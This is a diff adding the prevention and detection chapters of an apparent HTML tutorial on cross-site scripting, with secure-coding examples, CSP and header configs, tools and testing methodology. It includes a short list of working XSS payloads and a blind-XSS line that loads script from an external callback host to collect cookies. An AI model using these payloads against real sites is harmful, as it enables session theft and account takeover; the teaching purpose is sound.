+</div>
+
+
+<!-- ================================================================
+     PAGE 7 — PREVENTION
+     ================================================================ -->
+<div class="page" id="page-7">
+    <div class="page-header">
+        <div class="chapter-badge badge-defense">🛡️ Chapter 8</div>
+        <h1 class="page-title">XSS Prevention</h1>
+        <p class="page-subtitle">Defense requires multiple layers working together. No single technique is sufficient — you need output encoding, Content Security Policy, sanitization, and secure coding practices as a unified strategy.</p>
+    </div>
+
+    <div class="info-box success">
+        <div class="ib-icon">🏆</div>
+        <div class="ib-content">
+            <strong>The Golden Rule of XSS Prevention:</strong>
+            <p>Never trust user input. <strong>Always encode output based on the CONTEXT where it appears.</strong> Context-aware output encoding is the #1 defense against XSS.</p>
+        </div>
+    </div>
+
+    <!-- DEFENSE IN DEPTH -->
+    <h2 class="section-heading"><span class="sh-icon">🔐</span> Defense in Depth — 6 Layers</h2>
+
+    <div class="grid-auto">
+        <div class="prevention-card">
+            <div class="prev-icon" style="background:rgba(213,0,0,0.15);">📤</div>
+            <h4>Output Encoding <span class="tag tag-red">Primary Defense</span></h4>
+            <p>Convert dangerous characters (<code>&lt; &gt; " ' &amp;</code>) to safe HTML entities before rendering. Must be context-specific: HTML body, attribute, JS, URL, CSS.</p>
+        </div>
+        <div class="prevention-card">
+            <div class="prev-icon" style="background:rgba(108,99,255,0.15);">🧹</div>
+            <h4>HTML Sanitization</h4>
+            <p>For rich text content (WYSIWYG editors), use a whitelist-based sanitizer like DOMPurify to strip dangerous tags while preserving safe formatting.</p>
+        </div>
+        <div class="prevention-card">
+            <div class="prev-icon" style="background:rgba(0,221,255,0.15);">📋</div>
+            <h4>Content Security Policy</h4>
+            <p>HTTP header restricting which scripts can run. Even if XSS payload is injected, CSP can block its execution. Use nonces for inline scripts.</p>
+        </div>
+        <div class="prevention-card">
+            <div class="prev-icon" style="background:rgba(255,204,0,0.15);">🍪</div>
+            <h4>Cookie Security</h4>
+            <p>Set <code>HttpOnly</code> (blocks JS access), <code>Secure</code> (HTTPS only), and <code>SameSite</code> (prevents CSRF) flags on all session cookies.</p>
+        </div>
+        <div class="prevention-card">
+            <div class="prev-icon" style="background:rgba(0,200,83,0.15);">✅</div>
+            <h4>Safe DOM APIs</h4>
+            <p>Use <code>textContent</code> instead of <code>innerHTML</code>, avoid <code>eval()</code>, validate URLs before use, and use <code>setAttribute()</code> for HTML attributes.</p>
+        </div>
+        <div class="prevention-card">
+            <div class="prev-icon" style="background:rgba(255,136,0,0.15);">🔒</div>
+            <h4>Trusted Types</h4>
+            <p>Browser API that enforces type-safe DOM manipulation. Requires sanitized typed objects for dangerous sinks — prevents DOM XSS at the browser level.</p>
+        </div>
+    </div>
+
+    <!-- CONTEXT ENCODING -->
+    <h2 class="section-heading"><span class="sh-icon">📝</span> Context-Specific Encoding Rules</h2>
+
+    <div class="tbl-wrap">
+        <table class="data-table">
+            <thead>
+                <tr><th>Context</th><th>Encoding Method</th><th>Characters to Encode</th><th>Example</th></tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><span class="tag tag-blue">HTML Body</span></td>
+                    <td>HTML Entity Encoding</td>
+                    <td><code>&amp; &lt; &gt; " ' /</code></td>
+                    <td><code>&amp;lt;script&amp;gt;</code> shows as text</td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-orange">HTML Attribute</span></td>
+                    <td>HTML Attribute Encoding</td>
+                    <td>All non-alphanumeric → <code>&amp;#xHH;</code></td>
+                    <td>Always quote attributes!</td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-cyan">JavaScript</span></td>
+                    <td>JavaScript String Encoding</td>
+                    <td>Non-alphanumeric → <code>\uXXXX</code></td>
+                    <td><code>JSON.stringify(input)</code></td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-green">URL Parameter</span></td>
+                    <td>URL / Percent Encoding</td>
+                    <td>Non-alphanumeric → <code>%HH</code></td>
+                    <td><code>encodeURIComponent(input)</code></td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-purple">CSS Value</span></td>
+                    <td>CSS Encoding</td>
+                    <td>Non-alphanumeric → <code>\XXXXXX</code></td>
+                    <td>Avoid user input in CSS if possible</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- SECURE CODE -->
+    <h2 class="section-heading"><span class="sh-icon">💻</span> Secure Code Examples</h2>
+
+    <div class="tabs">
+        <div class="tab-nav">
+            <button class="tab-btn active" onclick="switchTab(this, 'prev-php')">🐘 PHP</button>
+            <button class="tab-btn" onclick="switchTab(this, 'prev-js')">🟩 JS/DOM</button>
+            <button class="tab-btn" onclick="switchTab(this, 'prev-py')">🐍 Python</button>
+            <button class="tab-btn" onclick="switchTab(this, 'prev-fw')">⚛️ Frameworks</button>
+        </div>
+        <div class="tab-pane active" id="prev-php">
+            <div class="code-block">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">PHP — Context-Aware Encoding</span><button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button></div>
+                <div class="code-body"><span class="c-comment">// HTML Body Context</span>
+<span class="c-keyword">echo</span> <span class="c-string">"&lt;div&gt;"</span> . <span class="c-safe">htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</span> . <span class="c-string">"&lt;/div&gt;"</span>;
+
+<span class="c-comment">// HTML Attribute Context</span>
+<span class="c-keyword">echo</span> <span class="c-string">'&lt;input value="'</span> . <span class="c-safe">htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</span> . <span class="c-string">'"&gt;'</span>;
+
+<span class="c-comment">// JavaScript Context (use json_encode!)</span>
+<span class="c-keyword">echo</span> <span class="c-string">'&lt;script&gt;var name = '</span> . <span class="c-safe">json_encode($input, JSON_HEX_TAG | JSON_HEX_AMP)</span> . <span class="c-string">';&lt;/script&gt;'</span>;
+
+<span class="c-comment">// URL Parameter Context</span>
+<span class="c-keyword">echo</span> <span class="c-string">'&lt;a href="/page?q='</span> . <span class="c-safe">urlencode($input)</span> . <span class="c-string">'"&gt;Link&lt;/a&gt;'</span>;
+
+<span class="c-comment">// Cookie Security</span>
+<span class="c-func">setcookie</span>(<span class="c-string">'session'</span>, <span class="c-var">$token</span>, [
+    <span class="c-string">'httponly'</span> =&gt; <span class="c-safe">true</span>,
+    <span class="c-string">'secure'</span>   =&gt; <span class="c-safe">true</span>,
+    <span class="c-string">'samesite'</span> =&gt; <span class="c-safe">'Lax'</span>,
+]);</div>
+            </div>
+        </div>
+        <div class="tab-pane" id="prev-js">
+            <div class="code-block">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">JavaScript — Safe DOM Manipulation</span><button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button></div>
+                <div class="code-body"><span class="c-comment">// ✅ SAFE — textContent (renders as text, NOT HTML)</span>
+element.<span class="c-safe">textContent</span> = userInput;
+
+<span class="c-comment">// ✅ SAFE — setAttribute</span>
+element.<span class="c-safe">setAttribute</span>(<span class="c-string">'title'</span>, userInput);
+
+<span class="c-comment">// ✅ SAFE — classList</span>
+element.<span class="c-safe">classList.add</span>(sanitizedClass);
+
+<span class="c-comment">// ✅ SAFE — If you MUST render HTML, sanitize first</span>
+<span class="c-keyword">import</span> DOMPurify <span class="c-keyword">from</span> <span class="c-string">'dompurify'</span>;
+element.innerHTML = <span class="c-safe">DOMPurify.sanitize(userInput)</span>;
+
+<span class="c-comment">// ✅ SAFE — URL validation</span>
+<span class="c-keyword">function</span> <span class="c-func">isValidUrl</span>(url) {
+    <span class="c-keyword">try</span> {
+        <span class="c-keyword">const</span> parsed = <span class="c-keyword">new</span> URL(url);
+        <span class="c-keyword">return</span> [<span class="c-string">'http:'</span>, <span class="c-string">'https:'</span>]
+            .includes(parsed.protocol);
+    } <span class="c-keyword">catch</span> { <span class="c-keyword">return false</span>; }
+}
+
+<span class="c-comment">// ❌ NEVER DO:</span>
+<span class="c-danger">element.innerHTML = userInput;</span>
+<span class="c-danger">eval(userInput);</span>
+<span class="c-danger">document.write(userInput);</span>
+<span class="c-danger">setTimeout(userInput, 1000);</span></div>
+            </div>
+        </div>
+        <div class="tab-pane" id="prev-py">
+            <div class="code-block">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">Python — Flask/Jinja2</span><button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button></div>
+                <div class="code-body"><span class="c-comment"># ✅ Jinja2 AUTO-ESCAPES by default!</span>
+<span class="c-comment"># In template: {{ user_input }} → auto HTML-encoded</span>
+
+<span class="c-comment"># ❌ DANGEROUS — bypasses auto-escaping:</span>
+<span class="c-comment"># {{ user_input | safe }}  ← NEVER with user data!</span>
+
+<span class="c-comment"># Explicit encoding in Python:</span>
+<span class="c-keyword">from</span> markupsafe <span class="c-keyword">import</span> escape
+safe = <span class="c-safe">escape(user_input)</span>
+
+<span class="c-comment"># For rich HTML — use bleach or nh3:</span>
+<span class="c-keyword">import</span> bleach
+clean = <span class="c-safe">bleach.clean</span>(user_html,
+    tags=[<span class="c-string">'p'</span>, <span class="c-string">'b'</span>, <span class="c-string">'i'</span>, <span class="c-string">'a'</span>, <span class="c-string">'ul'</span>, <span class="c-string">'li'</span>],
+    attributes={<span class="c-string">'a'</span>: [<span class="c-string">'href'</span>, <span class="c-string">'title'</span>]},
+    strip=<span class="c-const">True</span>
+)
+
+<span class="c-comment"># Flask cookie security</span>
+app.config[<span class="c-string">'SESSION_COOKIE_HTTPONLY'</span>] = <span class="c-safe">True</span>
+app.config[<span class="c-string">'SESSION_COOKIE_SECURE'</span>]   = <span class="c-safe">True</span>
+app.config[<span class="c-string">'SESSION_COOKIE_SAMESITE'</span>] = <span class="c-safe">'Lax'</span></div>
+            </div>
+        </div>
+        <div class="tab-pane" id="prev-fw">
+            <div class="code-block">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">React / Vue / Angular — Safe & Dangerous</span><button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button></div>
+                <div class="code-body"><span class="c-comment">// ═══════════ REACT ═══════════</span>
+<span class="c-comment">// ✅ SAFE — JSX auto-escapes</span>
+<span class="c-keyword">return</span> <span class="c-tag">&lt;div&gt;</span>{userInput}<span class="c-tag">&lt;/div&gt;</span>;
+
+<span class="c-comment">// ❌ DANGEROUS — bypasses auto-escaping</span>
+<span class="c-keyword">return</span> <span class="c-tag">&lt;div</span> <span class="c-danger">dangerouslySetInnerHTML</span>={{__html: userInput}} <span class="c-tag">/&gt;</span>;
+
+<span class="c-comment">// ❌ DANGEROUS — javascript: URLs in href</span>
+<span class="c-keyword">return</span> <span class="c-tag">&lt;a</span> <span class="c-attr">href</span>={<span class="c-danger">userUrl</span>}<span class="c-tag">&gt;</span>Link<span class="c-tag">&lt;/a&gt;</span>;  <span class="c-comment">// Validate protocol!</span>
+
+<span class="c-comment">// ═══════════ VUE ═══════════</span>
+<span class="c-comment">// ✅ SAFE — {{ }} auto-escapes</span>
+<span class="c-tag">&lt;div&gt;</span>{{ userInput }}<span class="c-tag">&lt;/div&gt;</span>
+
+<span class="c-comment">// ❌ DANGEROUS — v-html renders raw HTML</span>
+<span class="c-tag">&lt;div</span> <span class="c-danger">v-html</span>=<span class="c-string">"userInput"</span><span class="c-tag">&gt;&lt;/div&gt;</span>
+
+<span class="c-comment">// ═══════════ ANGULAR ═══════════</span>
+<span class="c-comment">// ✅ SAFE — {{ }} auto-escapes</span>
+<span class="c-tag">&lt;div&gt;</span>{{ userInput }}<span class="c-tag">&lt;/div&gt;</span>
+
+<span class="c-comment">// ❌ DANGEROUS — bypass sanitizer</span>
+<span class="c-danger">this.sanitizer.bypassSecurityTrustHtml(input)</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CSP -->
+    <h2 class="section-heading"><span class="sh-icon">📋</span> Content Security Policy (CSP)</h2>
+
+    <p class="body-text">
+        CSP is an HTTP response header that tells the browser <strong>which scripts are allowed to execute</strong>. Even if an attacker injects a script, CSP can prevent it from running.
+    </p>
+
+    <div class="code-block">
+        <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">HTTP Header — CSP Examples (Progressive)</span><button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button></div>
+        <div class="code-body"><span class="c-comment"># ═══════════════════════════════════════════════</span>
+<span class="c-comment"># Level 1: Basic CSP — Blocks inline scripts</span>
+<span class="c-comment"># ═══════════════════════════════════════════════</span>
+Content-Security-Policy:
+    default-src <span class="c-string">'self'</span>;
+    script-src  <span class="c-string">'self'</span> https://cdn.example.com;
+    style-src   <span class="c-string">'self'</span> <span class="c-string">'unsafe-inline'</span>;
+    img-src     <span class="c-string">'self'</span> data: https:;
+    <span class="c-safe">object-src  'none'</span>;
+    <span class="c-safe">frame-ancestors 'self'</span>;
+
+<span class="c-comment"># ═══════════════════════════════════════════════</span>
+<span class="c-comment"># Level 2: Strict CSP with Nonces (RECOMMENDED)</span>
+<span class="c-comment"># ═══════════════════════════════════════════════</span>
+Content-Security-Policy:
+    default-src <span class="c-string">'none'</span>;
+    script-src  <span class="c-safe">'nonce-{RANDOM}'</span> <span class="c-safe">'strict-dynamic'</span>;
+    style-src   <span class="c-safe">'nonce-{RANDOM}'</span>;
+    img-src     <span class="c-string">'self'</span>;
+    connect-src <span class="c-string">'self'</span>;
+    <span class="c-safe">object-src  'none'</span>;
+    <span class="c-safe">base-uri    'self'</span>;
+    <span class="c-safe">form-action 'self'</span>;
+    <span class="c-safe">frame-ancestors 'none'</span>;
+
+<span class="c-comment"># In HTML — only scripts with matching nonce run:</span>
+<span class="c-comment"># &lt;script nonce="RANDOM"&gt;...&lt;/script&gt;  ← RUNS ✅</span>
+<span class="c-comment"># &lt;script&gt;alert(1)&lt;/script&gt;            ← BLOCKED ❌</span>
+<span class="c-comment"># Attacker can't predict the random nonce!</span></div>
+    </div>
+
+    <div class="grid-2">
+        <div class="info-box success">
+            <div class="ib-icon">✅</div>
+            <div class="ib-content">
+                <strong>Strong CSP:</strong>
+                <p><code>'nonce-{random}'</code> + <code>'strict-dynamic'</code> — only scripts with matching nonce execute. Attacker can't predict the nonce value.</p>
+            </div>
+        </div>
+        <div class="info-box danger">
+            <div class="ib-icon">❌</div>
+            <div class="ib-content">
+                <strong>Weak CSP:</strong>
+                <p><code>'unsafe-inline'</code> or <code>'unsafe-eval'</code> — completely defeats the purpose of CSP! Avoid at all costs.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- SECURITY HEADERS -->
+    <h2 class="section-heading"><span class="sh-icon">📡</span> Essential Security Headers</h2>
+
+    <div class="code-block">
+        <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">Complete Security Headers — Nginx</span><button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button></div>
+        <div class="code-body"><span class="c-comment"># XSS & Injection Defense</span>
+add_header <span class="c-safe">Content-Security-Policy</span> <span class="c-string">"default-src 'self'; script-src 'self'"</span> always;
+add_header <span class="c-safe">X-Content-Type-Options</span>  <span class="c-string">"nosniff"</span> always;
+
+<span class="c-comment"># Clickjacking Defense</span>
+add_header <span class="c-safe">X-Frame-Options</span>         <span class="c-string">"DENY"</span> always;
+
+<span class="c-comment"># Transport Security</span>
+add_header <span class="c-safe">Strict-Transport-Security</span> <span class="c-string">"max-age=31536000; includeSubDomains"</span> always;
+
+<span class="c-comment"># Privacy</span>
+add_header <span class="c-safe">Referrer-Policy</span>          <span class="c-string">"strict-origin-when-cross-origin"</span> always;
+
+<span class="c-comment"># Feature Control</span>
+add_header <span class="c-safe">Permissions-Policy</span>       <span class="c-string">"camera=(), microphone=(), geolocation=()"</span> always;
+
+<span class="c-comment"># DISABLE legacy XSS filter (can cause issues)</span>
+add_header <span class="c-safe">X-XSS-Protection</span>        <span class="c-string">"0"</span> always;</div>
+    </div>
+
+    <!-- DEFENSE MATRIX -->
+    <h2 class="section-heading"><span class="sh-icon">🎯</span> Defense Effectiveness Matrix</h2>
+
+    <div class="comparison-wrap">
+        <table class="comparison-table">
+            <thead>
+                <tr>
+                    <th>Defense</th>
+                    <th style="color:var(--orange)">↩️ Reflected</th>
+                    <th style="color:var(--red)">💾 Stored</th>
+                    <th style="color:var(--cyan)">🔀 DOM-Based</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td>Output Encoding</td><td><span class="check-yes">✅ Effective</span></td><td><span class="check-yes">✅ Effective</span></td><td><span class="check-mid">⚠️ N/A (client)</span></td></tr>
+                <tr><td>HTML Sanitization</td><td><span class="check-yes">✅ Effective</span></td><td><span class="check-yes">✅ Effective</span></td><td><span class="check-yes">✅ DOMPurify</span></td></tr>
+                <tr><td>CSP with Nonce</td><td><span class="check-yes">✅ Effective</span></td><td><span class="check-yes">✅ Effective</span></td><td><span class="check-yes">✅ Effective</span></td></tr>
+                <tr><td>HttpOnly Cookies</td><td><span class="check-mid">⚠️ Limits impact</span></td><td><span class="check-mid">⚠️ Limits impact</span></td><td><span class="check-mid">⚠️ Limits impact</span></td></tr>
+                <tr><td>Trusted Types</td><td><span class="check-mid">⚠️ Partial</span></td><td><span class="check-mid">⚠️ Partial</span></td><td><span class="check-yes">✅ Primary defense!</span></td></tr>
+                <tr><td>Safe DOM APIs</td><td><span class="check-no">— N/A</span></td><td><span class="check-no">— N/A</span></td><td><span class="check-yes">✅ Primary defense!</span></td></tr>
+                <tr><td>WAF</td><td><span class="check-mid">⚠️ Bypassable</span></td><td><span class="check-mid">⚠️ Bypassable</span></td><td><span class="check-no">❌ Can't detect</span></td></tr>
+                <tr><td>Auto-escaping Templates</td><td><span class="check-yes">✅ Effective</span></td><td><span class="check-yes">✅ Effective</span></td><td><span class="check-no">— N/A</span></td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="page-nav">
+        <button class="btn btn-outline" onclick="navigateTo(6)">← Attack Techniques</button>
+        <button class="btn btn-primary" onclick="navigateTo(8)">Next: Detection & Summary →</button>
+    </div>
+</div>
+
+
+<!-- ================================================================
+     PAGE 8 — DETECTION & SUMMARY
+     ================================================================ -->
+<div class="page" id="page-8">
+    <div class="page-header">
+        <div class="chapter-badge badge-detect">🔍 Chapter 9</div>
+        <h1 class="page-title">Detection, Tools & Summary</h1>
+        <p class="page-subtitle">Your complete toolkit for finding XSS vulnerabilities, a step-by-step testing methodology, a comparison of all XSS types, and quick-reference cheatsheets.</p>
+    </div>
+
+    <!-- TESTING TOOLS -->
+    <h2 class="section-heading"><span class="sh-icon">🛠️</span> XSS Testing Tools</h2>
+
+    <div class="grid-3">
+        <div class="card card-accent-orange">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(255,136,0,0.15)">🎯</div>Burp Suite</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);margin-bottom:10px;">Industry-standard web security testing platform. Includes Proxy, Scanner, Repeater, Intruder, and the DOM Invader extension for DOM XSS testing.</p>
+            <div class="flex flex-gap-8">
+                <span class="tag tag-orange">Professional</span>
+                <span class="tag tag-yellow">Community Free</span>
+            </div>
+        </div>
+        <div class="card card-accent-green">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(0,200,83,0.15)">🕷️</div>OWASP ZAP</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);margin-bottom:10px;">Free, open-source alternative to Burp. Active scanner with XSS rules, Ajax Spider for JS-heavy apps, and scripting engine for custom tests.</p>
+            <div class="flex flex-gap-8">
+                <span class="tag tag-green">100% Free</span>
+                <span class="tag tag-green">Open Source</span>
+            </div>
+        </div>
+        <div class="card card-accent-cyan">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(0,221,255,0.15)">🦊</div>Dalfox</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);margin-bottom:10px;">Fast CLI XSS scanner written in Go. Excellent for automated parameter fuzzing and pipeline integration.</p>
+            <div class="flex flex-gap-8">
+                <span class="tag tag-cyan">CLI</span>
+                <span class="tag tag-green">Open Source</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="grid-2">
+        <div class="card">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(108,99,255,0.15)">⚡</div>XSSStrike</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">Python-based XSS detection suite with intelligent payload generation, DOM analysis, and crawling.</p>
+            <div class="code-block mb-0 mt-8">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">CLI</span></div>
+                <div class="code-body" style="font-size:0.78rem;padding:12px;">python3 xsstrike.py -u <span class="c-string">"https://target.com/search?q=test"</span>
+python3 xsstrike.py -u <span class="c-string">"https://target.com"</span> --crawl</div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(255,204,0,0.15)">👁️</div>XSS Hunter</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">Essential for Blind XSS. Provides unique payloads that call back with screenshots, cookies, DOM, and URL when triggered.</p>
+            <div class="code-block mb-0 mt-8">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">Usage</span></div>
+                <div class="code-body" style="font-size:0.78rem;padding:12px;"><span class="c-comment"># Get your unique payload from XSS Hunter</span>
+<span class="c-comment"># Inject into contact forms, User-Agent, etc.</span>
+<span class="c-comment"># Wait for callback with screenshot + cookies</span>
+<span class="c-string">"&gt;&lt;script src=https://YOUR-ID.xss.ht&gt;&lt;/script&gt;</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TESTING METHODOLOGY -->
+    <h2 class="section-heading"><span class="sh-icon">📋</span> Testing Methodology</h2>
+
+    <div class="flow-container">
+        <div class="attack-steps">
+            <div class="attack-step" style="border-left-color:var(--blue);">
+                <div class="as-num" style="background:var(--blue);">1</div>
+                <div class="as-emoji">🗺️</div>
+                <div class="as-content">
+                    <h4>Map All Input Points</h4>
+                    <p>URL parameters, form fields (visible + hidden), HTTP headers (User-Agent, Referer, Cookie), JSON/XML bodies, file upload names, WebSocket messages, postMessage data.</p>
+                </div>
+            </div>
+            <div class="attack-step" style="border-left-color:var(--cyan);">
+                <div class="as-num" style="background:var(--cyan);color:var(--dark);">2</div>
+                <div class="as-emoji">🏷️</div>
+                <div class="as-content">
+                    <h4>Inject Canary String</h4>
+                    <p>Use a unique identifier like <code>xss123test</code> or <code>aaa"'&lt;&gt;bbb</code> to find where your input appears in the response and what characters survive.</p>
+                </div>
+            </div>
+            <div class="attack-step" style="border-left-color:var(--yellow);">
+                <div class="as-num" style="background:var(--yellow);color:var(--dark);">3</div>
+                <div class="as-emoji">🔍</div>
+                <div class="as-content">
+                    <h4>Identify Injection Context</h4>
+                    <p>HTML body? HTML attribute? JavaScript string? URL? CSS? Each context requires a different breakout strategy and payload format.</p>
+                </div>
+            </div>
+            <div class="attack-step" style="border-left-color:var(--orange);">
+                <div class="as-num" style="background:var(--orange);">4</div>
+                <div class="as-emoji">🎯</div>
+                <div class="as-content">
+                    <h4>Craft & Test Payloads</h4>
+                    <p>Start with basic payloads. If blocked, apply encoding, case variations, alternative tags/events, and filter bypass techniques.</p>
+                </div>
+            </div>
+            <div class="attack-step" style="border-left-color:var(--red);">
+                <div class="as-num" style="background:var(--red);">5</div>
+                <div class="as-emoji">📝</div>
+                <div class="as-content">
+                    <h4>Prove Impact & Document</h4>
+                    <p>Demonstrate real impact (cookie theft, account takeover) — not just <code>alert(1)</code>. Provide clear reproduction steps, affected URLs, and fix recommendations.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ALL 5 TYPES COMPARISON -->
+    <h2 class="section-heading"><span class="sh-icon">📊</span> Complete XSS Types Comparison</h2>
+
+    <div class="comparison-wrap">
+        <table class="comparison-table" style="font-size:0.8rem;">
+            <thead>
+                <tr>
+                    <th>Feature</th>
+                    <th style="color:var(--orange)">↩️ Reflected</th>
+                    <th style="color:var(--red)">💾 Stored</th>
+                    <th style="color:var(--cyan)">🔀 DOM</th>
+                    <th style="color:var(--text-muted)">👁️ Blind</th>
+                    <th style="color:var(--purple)">🪞 Self</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td>Persistence</td><td>Non-persistent</td><td><strong>Persistent</strong></td><td>Non-persistent</td><td><strong>Persistent</strong></td><td>Varies</td></tr>
+                <tr><td>Server Involved?</td><td>✅ Reflects</td><td>✅ Stores</td><td>❌ Never</td><td>✅ Stores</td><td>Varies</td></tr>
+                <tr><td>Social Eng. Needed?</td><td>✅ Yes</td><td>❌ No</td><td>✅ Yes</td><td>❌ No</td><td>✅ Yes</td></tr>
+                <tr><td>Victims</td><td>1 per click</td><td><strong>All visitors</strong></td><td>1 per click</td><td>Admin/internal</td><td>Only self</td></tr>
+                <tr><td>WAF Detection</td><td>Moderate</td><td>Moderate</td><td><strong>Very Hard</strong></td><td>Very Hard</td><td>Easy</td></tr>
+                <tr><td>Severity</td><td><span class="severity-high">High</span></td><td><span class="severity-critical">Critical</span></td><td><span class="severity-high">High</span></td><td><span class="severity-critical">Critical</span></td><td><span class="severity-low">Low</span></td></tr>
+                <tr><td>Bug Bounty</td><td>✅ Accepted</td><td>✅ $$$$</td><td>✅ Accepted</td><td>✅ $$$$</td><td>❌ Usually excluded</td></tr>
+                <tr><td>Primary Defense</td><td>Output encoding</td><td>Output encoding</td><td>Safe DOM APIs</td><td>Output encoding</td><td>N/A (low risk)</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- QUICK REF PAYLOADS -->
+    <h2 class="section-heading"><span class="sh-icon">⚡</span> Quick Reference — Top Payloads</h2>
+
+    <div class="card">
+        <div class="payload-showcase">
+            <div class="pi-item"><span class="pi-code">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><span class="tag tag-blue">HTML Body</span></div>
+            <div class="pi-item"><span class="pi-code">&lt;img src=x onerror=alert(1)&gt;</span><span class="tag tag-blue">HTML Body</span></div>
+            <div class="pi-item"><span class="pi-code">&lt;svg onload=alert(document.cookie)&gt;</span><span class="tag tag-blue">HTML Body</span></div>
+            <div class="pi-item"><span class="pi-code">" onfocus=alert(1) autofocus "</span><span class="tag tag-orange">Attribute</span></div>
+            <div class="pi-item"><span class="pi-code">'&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="tag tag-orange">Attribute</span></div>
+            <div class="pi-item"><span class="pi-code">';alert(1);//</span><span class="tag tag-yellow">JS String</span></div>
+            <div class="pi-item"><span class="pi-code">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="tag tag-yellow">JS Block</span></div>
+            <div class="pi-item"><span class="pi-code">javascript:alert(document.domain)</span><span class="tag tag-cyan">URL/href</span></div>
+        </div>
+    </div>
+
+    <!-- DEVELOPER CHECKLIST -->
+    <h2 class="section-heading"><span class="sh-icon">✅</span> Developer Security Checklist</h2>
+
+    <div class="grid-2">
+        <div class="card" style="border-left:3px solid var(--success);">
+            <h4 style="margin-bottom:14px;color:var(--success);">✅ Always Do</h4>
+            <ul class="checklist">
+                <li><span class="cl-icon cl-yes">✓</span> Encode output based on context (HTML, JS, URL, CSS)</li>
+                <li><span class="cl-icon cl-yes">✓</span> Use auto-escaping template engines</li>
+                <li><span class="cl-icon cl-yes">✓</span> Set <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> on cookies</li>
+                <li><span class="cl-icon cl-yes">✓</span> Implement Content Security Policy with nonces</li>
+                <li><span class="cl-icon cl-yes">✓</span> Use DOMPurify for rich HTML content</li>
+                <li><span class="cl-icon cl-yes">✓</span> Use <code>textContent</code> instead of <code>innerHTML</code></li>
+                <li><span class="cl-icon cl-yes">✓</span> Validate URLs (allow only <code>http:</code> / <code>https:</code>)</li>
+                <li><span class="cl-icon cl-yes">✓</span> Keep all frameworks and libraries updated</li>
+                <li><span class="cl-icon cl-yes">✓</span> Set security headers on all responses</li>
+                <li><span class="cl-icon cl-yes">✓</span> Code review for Source → Sink flows</li>
+            </ul>
+        </div>
+        <div class="card" style="border-left:3px solid var(--red);">
+            <h4 style="margin-bottom:14px;color:var(--red);">❌ Never Do</h4>
+            <ul class="checklist">
+                <li><span class="cl-icon cl-no">✗</span> Use <code>innerHTML</code> with user input</li>
+                <li><span class="cl-icon cl-no">✗</span> Use <code>eval()</code>, <code>setTimeout(string)</code>, <code>new Function()</code></li>
+                <li><span class="cl-icon cl-no">✗</span> Use <code>document.write()</code> with user data</li>
+                <li><span class="cl-icon cl-no">✗</span> Rely on client-side validation alone</li>
+                <li><span class="cl-icon cl-no">✗</span> Use <code>'unsafe-inline'</code> or <code>'unsafe-eval'</code> in CSP</li>
+                <li><span class="cl-icon cl-no">✗</span> Use <code>{{ var | safe }}</code> with user input (templates)</li>
+                <li><span class="cl-icon cl-no">✗</span> Use <code>dangerouslySetInnerHTML</code> with raw user data</li>
+                <li><span class="cl-icon cl-no">✗</span> Rely on blacklist-based input filtering</li>
+                <li><span class="cl-icon cl-no">✗</span> Display raw user input anywhere in HTML</li>
+                <li><span class="cl-icon cl-no">✗</span> Trust data from the database (always encode output)</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- PRACTICE PLATFORMS -->
+    <h2 class="section-heading"><span class="sh-icon">🎓</span> Practice Platforms</h2>
+
+    <div class="grid-2">
+        <div class="card">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(0,200,83,0.15)">🔰</div>Beginner</div>
+            <ul style="list-style:none;font-size:0.88rem;">
